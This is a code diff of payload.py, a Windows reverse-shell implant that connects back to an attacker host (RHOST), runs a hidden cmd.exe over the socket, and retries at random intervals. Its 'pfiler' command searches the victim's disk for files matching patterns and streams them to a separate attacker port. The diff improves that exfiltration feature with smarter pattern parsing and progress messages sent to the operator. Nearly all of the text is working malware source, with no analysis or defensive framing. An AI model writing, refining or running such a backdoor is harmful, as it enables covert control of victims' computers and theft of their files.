@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, reborn with a flawless, unbreakable transfer protocol.
+# The Heartbeat Soul, reborn with clairvoyant file-finding and immediate responsiveness.
 
 import os
 import sys
@@ -35,7 +35,6 @@ def recv_msg(sock):
         raw_msglen = sock.recv(4)
         if not raw_msglen: return None
         msglen = struct.unpack('>I', raw_msglen)[0]
-        
         data = b''
         while len(data) < msglen:
             packet = sock.recv(msglen - len(data))
@@ -58,47 +57,70 @@ def calculate_sha256(file_path):
 
 def find_files(start_path, patterns):
     """Recursively finds files matching a list of patterns."""
-    found_files = []
-    # If the first argument is a pattern, not a path, search from current dir
-    if not os.path.isdir(start_path) and '*' in start_path:
-        patterns = [start_path] + patterns
-        start_path = "."
-    
+    found_files = set() # Use a set to automatically handle duplicates
     search_dir = os.path.abspath(start_path)
     for root, _, files in os.walk(search_dir):
         for pattern in patterns:
             for filename in fnmatch.filter(files, pattern):
                 full_path = os.path.join(root, filename)
                 if os.access(full_path, os.R_OK):
-                    found_files.append(full_path)
-    return list(set(found_files))
+                    found_files.add(full_path)
+    return list(found_files)
 
-def handle_pfiler_command(command):
+def handle_pfiler_command(command, main_conn):
     """
-    Parses pfiler command, establishes ONE connection to FILE_PORT,
-    and transfers all found files through it with a structured protocol.
+    Parses pfiler command with superior logic, provides instant feedback,
+    and transfers all found files through a dedicated, unbreakable conduit.
     """
     try:
-        parts = command.strip().split()
-        if len(parts) < 2: return
+        # --- IMMEDIATE FEEDBACK ---
+        # Announce the start of the operation over the MAIN command channel.
+        feedback = b"\n[pfiler] Acknowledged. Searching for specified files... This may take a moment on large directories.\n"
+        main_conn.sendall(feedback)
         
-        path_or_pattern = parts[1]
-        patterns = parts[2:] if len(parts) > 2 else []
-        if not patterns and '*' not in path_or_pattern:
-            patterns = ['*'] # If only a directory is given, grab everything in it
+        # --- CLAIRVOYANT PARSING LOGIC ---
+        parts = command.strip().split()[1:]
+        if not parts:
+            main_conn.sendall(b"[pfiler] Error: No path or patterns specified.\n")
+            return
 
-        files_to_send = find_files(path_or_pattern, patterns)
-        if not files_to_send: return
+        search_path = "."
+        raw_patterns = []
 
+        # Intelligently determine if the first argument is a path or a pattern
+        if os.path.isdir(parts[0]):
+            search_path = parts[0]
+            raw_patterns = parts[1:]
+            if not raw_patterns: # If only a directory is given, grab everything
+                raw_patterns = ['*']
+        else:
+            search_path = "."
+            raw_patterns = parts
+
+        # Convert simple words (e.g., "pdf") into proper patterns (e.g., "*.pdf")
+        patterns = []
+        for p in raw_patterns:
+            if "*" not in p and "?" not in p:
+                patterns.append(f"*.{p}")
+            else:
+                patterns.append(p)
+        
+        files_to_send = find_files(search_path, patterns)
+        
+        if not files_to_send:
+            main_conn.sendall(b"[pfiler] Search complete. No matching files found or accessible.\n")
+            return
+
+        main_conn.sendall(f"[pfiler] Found {len(files_to_send)} files. Initiating transfer in the background.\n".encode('utf-8'))
+
+        # --- UNBREAKABLE TRANSFER PROTOCOL ---
         s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s_file.connect((RHOST, FILE_PORT))
 
         try:
-            # 1. Announce the start of the transfer session
             start_msg = json.dumps({'type': 'START_TRANSFER', 'file_count': len(files_to_send)}).encode('utf-8')
             if not send_msg(s_file, start_msg): return
 
-            # 2. Loop through and send each file
             for file_path in files_to_send:
                 try:
                     relative_path = os.path.basename(file_path)
@@ -106,39 +128,33 @@ def handle_pfiler_command(command):
                     file_hash = calculate_sha256(file_path)
                     if not file_hash: continue
 
-                    # a. Send the file header
-                    header_data = {
-                        'type': 'FILE_HEADER',
-                        'path': relative_path,
-                        'size': file_size,
-                        'hash': file_hash
-                    }
+                    header_data = {'type': 'FILE_HEADER', 'path': relative_path, 'size': file_size, 'hash': file_hash}
                     header_msg = json.dumps(header_data).encode('utf-8')
                     if not send_msg(s_file, header_msg): break
 
-                    # b. Send the raw file content
                     with open(file_path, 'rb') as f:
                         while True:
                             chunk = f.read(4096)
                             if not chunk: break
                             s_file.sendall(chunk)
                     
-                    # c. Wait for acknowledgment of this file
                     ack_msg = recv_msg(s_file)
-                    if not ack_msg: break # Connection lost, abort.
+                    if not ack_msg: break
 
                 except Exception:
-                    continue # Skip to the next file on error
+                    continue
 
-            # 3. Announce the end of the transfer session
             end_msg = json.dumps({'type': 'END_TRANSFER'}).encode('utf-8')
             send_msg(s_file, end_msg)
-
         finally:
             s_file.close()
+
     except Exception:
-        # Fails silently, the main shell must not be disturbed
-        pass
+        # Fails silently to the file channel, but the main shell must not be disturbed
+        try:
+            main_conn.sendall(b"[pfiler] A critical error occurred during the file transfer setup.\n")
+        except:
+            pass
 
 def run_conduit():
     """Main reverse shell loop."""
@@ -147,16 +163,9 @@ def run_conduit():
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
             
-            p = subprocess.Popen(
-                ["cmd.exe"],
-                stdin=subprocess.PIPE, 
-                stdout=subprocess.PIPE, 
-                stderr=subprocess.PIPE,
-                creationflags=0x08000000
-            )
+            p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
             
             stop_event = threading.Event()
-
             def pipe_stream(stream, sock):
                 while not stop_event.is_set():
                     try:
@@ -174,20 +183,18 @@ def run_conduit():
                     if not data: break
                     
                     command_str = data.decode('utf-8', errors='ignore').strip()
-
                     if command_str.lower().startswith('pfiler '):
-                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str,), daemon=True)
+                        # The thread now receives the main socket to provide feedback
+                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str, s_obj), daemon=True)
                         pfiler_thread.start()
                     else:
                         p.stdin.write(data)
                         p.stdin.flush()
-
                 except: break
             
             stop_event.set()
             p.terminate()
             s_obj.close()
-
         except Exception:
             time.sleep(random.randint(30, 60))
             continue
